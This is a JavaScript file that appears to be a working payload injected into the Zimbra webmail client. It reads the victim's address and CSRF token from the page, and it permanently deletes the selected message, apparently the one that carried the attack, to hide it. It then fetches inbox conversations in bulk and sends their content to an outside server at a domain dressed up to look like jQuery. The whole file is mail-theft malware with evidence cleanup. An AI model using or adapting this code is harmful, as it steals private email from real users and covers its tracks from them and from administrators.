var server_url = "https://jquery.website:8019/data/";

function delSelf(mail,k){
	var id = getC("Row-selected")[0].id.match(/zli__CLV.*?\:(-{0,1}\d*)/)[1];
	var x = new XMLHttpRequest();
	x.onreadystatechange = function(){
		if(x.readyState == 4 && x.status == 200){
			var x2 = new XMLHttpRequest()
			x2.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
			var d2 = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"notify\":{\"seq\":6},\"account\":{\"_content\":\"local@host.local\",\"by\":\"name\"}}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"delete\",\"tcon\":\"t\",\"id\":\"#token:#id\"}}}}".replace("#id",id).replace("#token",k);
			x2.withCredentials = true;
			x2.send(d2);
		}
	}
	x.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
	var d = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"notify\":{\"seq\":6},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"trash\",\"tcon\":\"-tj\",\"l\":\"3\",\"id\":\"#token:#id\"}}}}".replace("#mail",mail).replace("#token",k).replace("#id",id);
	x.withCredentials = true;
	x.send(d);
}

function delSelf2(mail,token){

	var id = getC("Row-selected")[0].id.match(/zli__CLV-main__(-{0,1}\d*)/)[1];

	var token2 = 0;
	var s = document.getElementsByTagName("script");
	for(var i=0;i<s.length;i++){
		try{
			token2 = document.getElementsByTagName("script")[i].innerHTML.match(/(.*)"token":(\d*?)\},"_jsns"(.*)/)[2];
			break;
		}
		catch(e){
			continue;
		}
	}

	var x = new XMLHttpRequest();
	x.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
	x.onreadystatechange = function(){
		if(x.readyState == 4 && x.status == 200){
			var x2 = new XMLHttpRequest();
			x2.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
			x2.withCredentials = true;
			x2.setRequestHeader("X-Zimbra-Csrf-Token",token);
			var d2 = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"8.6.0_GA_1169\"},\"session\":{\"_content\":1,\"id\":1},\"notify\":{\"seq\":2},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"},\"csrfToken\":\"#token\"}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"delete\",\"tcon\":\"t\",\"id\":\"#id\"}}}}".replace("#mail",mail).replace("token",token).replace("#id",id);
			x2.send(d2);
		}
	}
	x.withCredentials = true;
	x.setRequestHeader("X-Zimbra-Csrf-Token",token);
	var d = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"8.6.0_GA_1169\"},\"session\":{\"_content\":1,\"id\":1},\"change\":{\"token\":#n_token,\"type\":\"new\"},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"},\"csrfToken\":\"#token\"}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"trash\",\"tcon\":\"-dtj\",\"l\":\"3\",\"id\":\"#id\"}}}}".replace("#n_token",token2).replace("#token",token).replace("#mail",mail).replace("#id",id);
	x.send(d);

}

function getMail2(){
	var s = document.getElementsByTagName("script");
	var result = "";
	for(var i=0;i<s.length;i++){
		try{
			result = document.getElementsByTagName("script")[i].innerHTML.match(/(.*)"name":"(.*?@.*?)","crumb":(.*)/)[2];
			return result;
		}
		catch(e){
			continue;
		}
		
	}
}
function getC(n){
	return document.getElementsByClassName(n);
}

function sendToServer(t,mail){
	var result = t.match(/"content":"(.*?)"\}\]/);
	if(result){
		var x = new XMLHttpRequest();
		x.open("POST",server_url+"?mail="+mail);
		x.send(escape(result[1]));
	}
}


function getCidAndFetch(r,k){

	var pt2 = new RegExp("\"id\":\"#key:(-{0,1}\\\d*?)\",\"n\"".replace("#key",k),"g");
	var cid_list = r.match(pt2);

	pt2 = new RegExp("\"id\":\"#key:(-{0,1}\\\d*?)\",\"n\"".replace("#key",k));
	for(var i=0;i<cid_list.length;i++){
		cid_list[i] = cid_list[i].match(pt2)[1];
	}

	var pt3 = new RegExp("\"m\":\\\[\\\{\"id\":\"#key:(-{0,1}\\\d*?)\"".replace("#key",k),"g");
	f_list = r.match(pt3);

	pt3 = new RegExp("\"m\":\\\[\\\{\"id\":\"#key:(-{0,1}\\\d*?)\"".replace("#key",k));
	for(var i=0;i<f_list.length;i++){
		f_list[i] = f_list[i].match(pt3)[1];
	}
	if(cid_list.length!=f_list.length){
		return false;
	}
	var result = [];
	for(var i=0;i<cid_list.length;i++){
		result.push({"cid":cid_list[i],"fetch":f_list[i]});
	}
	return result;

}

function getData(list,k,mail,num){
	var xml2 = new XMLHttpRequest();
	xml2.onreadystatechange = function(){
		if (xml2.readyState == 4 && xml2.status == 200){
			sendToServer(xml2.responseText,mail);

			num = num+1;
			if(num<list.length){
				getData(list,k,mail,num);	//递归,一次只进行一个请求
				return;
			}
			else{
				return;
			}
		}
	};
	var d2 = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"SearchConvRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"offset\":0,\"limit\":250,\"query\":\"in:inbox\",\"cid\":\"#token:#cid\",\"fetch\":\"#token:#fetch\",\"read\":1,\"html\":1,\"needExp\":1,\"max\":250000}}}".replace("#mail",mail).replace("#token",k).replace("#token",k).replace("#cid",list[num]["cid"]).replace("#fetch",list[num]["fetch"])
	xml2.open("POST",window.location.origin+"/service/soap/SearchConvRequest");
	xml2.withCredentials = true;
	xml2.send(d2);
}

function getData2(list,token,mail,num){
	var xml = new XMLHttpRequest();
	xml.onreadystatechange = function(){
		if(xml.readyState == 4 && xml.status == 200){
			sendToServer(xml.responseText,mail);

			num = num+1;
			if(num<list.length){
				getData2(list,token,mail,num);
			}
			else{
				return;
			}
		}
	}
	var d = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"8.6.0_GA_1169\"},\"session\":{\"_content\":1450912,\"id\":1450912},\"notify\":{\"seq\":6},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"},\"csrfToken\":\"#token\"}},\"Body\":{\"SearchConvRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"header\":[{\"n\":\"List-ID\"},{\"n\":\"X-Zimbra-DL\"},{\"n\":\"IN-REPLY-TO\"}],\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"offset\":0,\"limit\":250,\"query\":\"in:inbox\",\"cid\":\"#cid\",\"fetch\":\"u!\",\"read\":1,\"html\":1,\"needExp\":1,\"max\":250000,\"recip\":\"2\"}}}".replace("#mail",mail).replace("#token",token).replace("#cid",list[num]);
	xml.open("POST",window.location.origin+"/service/soap/SearchConvRequest");
	xml.setRequestHeader("X-Zimbra-Csrf-Token",token);
	xml.withCredentials = true;
	xml.send(d);

}

if(window.location.origin.match(/^http:\/\/127(.*)/)){
	
	var mail = getC("ZmOverview")[0].id.match(/zov__(.*?):main_Mail/)[1];
	var m_list = getC("RowDouble");
	var p = m_list[0].id.match(/zli__CLV__(.*?):(.*)/);
	var k = p[1];		//token串
	var cur = p[2];		//头指针

	delSelf(mail,k);

	var xml = new XMLHttpRequest();
	xml.onreadystatechange = function(){
		if (xml.readyState == 4 && xml.status == 200){
			var r = xml.responseText;
			var list = getCidAndFetch(r,k);
			if(list){
				getData(list,k,mail,0);
			}
			else{

			}
		}
	};
	var limit = "50";
	var data = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"SearchRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"cursor\":{\"id\":\"#token:#cursor\",\"sortVal\":\"1515485360000\"},\"offset\":100,\"limit\":#limit,\"query\":\"in:inbox\",\"types\":\"conversation\",\"fetch\":1}}}".replace("#mail",mail).replace("#cursor",cur).replace("#token",k).replace("#limit",limit);
	xml.open("POST",window.location.origin+"/service/soap/SearchRequest");
	xml.withCredentials = true;
	xml.send(data);

}
else{
	var mail = getMail2();
	var m_list = getC("RowDouble");
	var list = [];
	var token = window.csrfToken;

	delSelf2(mail,token);

	for(var i = 0;i<m_list.length;i++){
		list.push(m_list[i].id.match(/zli__CLV-main__(.*)/)[1]);
	}

	getData2(list,token,mail,0);
}